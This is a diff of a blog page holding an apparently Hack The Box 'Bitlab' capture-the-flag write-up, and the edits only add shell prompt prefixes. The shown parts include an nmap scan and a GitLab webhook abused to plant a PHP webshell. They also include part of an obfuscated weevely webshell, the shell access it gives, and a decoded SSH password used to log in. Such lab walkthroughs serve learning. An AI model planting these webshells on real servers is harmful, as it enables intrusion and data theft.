@@ -8,7 +8,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.
 First we add the box ip to our hosts file and let&amp;rsquo;s start!
-$ echo &amp;#34;10.10.10.114 bitlab.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts User flag. Let&amp;rsquo;s start with the classic nmap scan:
+[hg8@archbook ~]$ echo &amp;#34;10.10.10.114 bitlab.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts User flag. Let&amp;rsquo;s start with the classic nmap scan:
 nmap -sV -sT -sC bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-26 02:00 CEST PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>
 <meta name="keywords" content="hackthebox, ctf, bitlab"/>
 <meta name="robots" content="noodp"/>
@@ -184,7 +184,7 @@ nmap -sV -sT -sC bitlab.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-2
     <div class="post-content">
       <p>Bitlab box was an interesting box, user part was typical real-life scenario (actually meet this scenario during a pentest) while the root part was my first time Reverse Engineering.</p>
 <p>First we add the box ip to our hosts file and let&rsquo;s start!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.114 bitlab.htb&#34;</span> &gt;&gt; /etc/hosts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.114 bitlab.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><h1 id="user-flag">User flag.</h1>
 <p>Let&rsquo;s start with the classic nmap scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sV -sT -sC bitlab.htb
@@ -233,9 +233,9 @@ $branch <span style="color:#f92672">=</span> $payload<span style="color:#f92672"
 </code></pre></div><p>This a rather simple script. Judging from the <code>if</code> condition we understand that the script will <code>cd</code> into <code>../profile/</code> directory and then <code>git pull</code> to get the latest changes on every merged merge request. It&rsquo;s our luck, because we have control over the <code>profile</code> repository which is available through the Gitlab instance with our credentials. That means that if we merge a file after a<code>merge_request</code> to the <code>profile</code> repository, this said file will automatically be pulled on the server by the <code>deployer/index.php</code> webhook. That&rsquo;s the perfect scenario for a webshell don&rsquo;t you thin? :)</p>
 <p>Through this Gitlab interface we can add a new file to our the <code>profile</code> repository, it will be faster than cloning.</p>
 <p>I used <code>weevely</code> to generate a php webshell :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python weevely.py generate htbpassword hg8.php
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python weevely.py generate htbpassword hg8.php
 Generated <span style="color:#e6db74">&#39;hg8.php&#39;</span> with password <span style="color:#e6db74">&#39;htbpassword&#39;</span> of <span style="color:#ae81ff">762</span> byte size.
-$ cat hg8.php
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat hg8.php
 &lt;?php
 $r<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$k=&#34;ab+-c7+-377b&#34;;$kh=+-&#34;3b+-25356491d+-a&#34;;$+-kf=&#34;+-be0+-0e7cb757+-b&#34;;$p=+-&#34;w0NSnMM+-i&#39;</span>;
 $A<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;+-j};}}r+-e+-tur+-n $o;}if(+-@preg_+-+-matc+-h(&#34;/$kh(+-.+)+-$kf/&#34;,@file_get_+-conten&#39;</span>;
@@ -252,7 +252,7 @@ $u<span style="color:#f92672">=</span>$n<span style="color:#f92672">(</span><spa
 Our webshell is now in the <code>profile</code> repository :</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67625567-7913c180-f82f-11e9-9a78-54c020336a58.png" alt="2019-10-26-223029_1281x515_scrot"></p>
 <p>If the webhook worked properly our new file should already be on the server, let&rsquo;s try it out :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python weevely.py http://bitlab.htb/profile/hg8.php htbpassword
 
 weevely&gt; id
 uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
@@ -296,14 +296,14 @@ Array
 
 <span style="color:#f92672">)</span>
 </code></pre></div><p>Decoding the password gives the following:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;c3NoLXN0cjBuZy1wQHNz==&#34;</span> | base64 -di
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;c3NoLXN0cjBuZy1wQHNz==&#34;</span> | base64 -di
 ssh-str0ng-p@ss
 </code></pre></div><p>Awesome, we got the ssh password for user <code>clave</code> let&rsquo;s go for the user flag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh clave@bitlab.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh clave@bitlab.htb
 clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 Permission denied, please try again.
 </code></pre></div><p><code>Permission denied</code> that&rsquo;s disappointing and strange. The database entry clearly state the user is <code>clave</code> (we saw previously that no other user are present on the box). The password itself state ssh&hellip; Could it be that it was simply the clear-text password&hellip;?</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh clave@bitlab.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh clave@bitlab.htb
 clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 Last login: Sun Oct <span style="color:#ae81ff">27</span> 14:26:51 <span style="color:#ae81ff">2019</span> from 10.10.10.10
 clave@bitlab:~$ cat user.txt
@@ -313,7 +313,7 @@ clave@bitlab:~$ cat user.txt
 <h1 id="root-flag">Root Flag</h1>
 <h2 id="recon">Recon</h2>
 <p>The recon part was quite quick, a Windows executable named <code>RemoteConnection.exe</code> was present on the home folder. Let&rsquo;s pull it and start the analysis:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ scp clave@bitlab.htb:~/RemoteConnection.exe .
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ scp clave@bitlab.htb:~/RemoteConnection.exe .
 clave@bitlab.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
 RemoteConnection.exe                                                100%   14KB 279.5KB/s   00:00
 </code></pre></div>
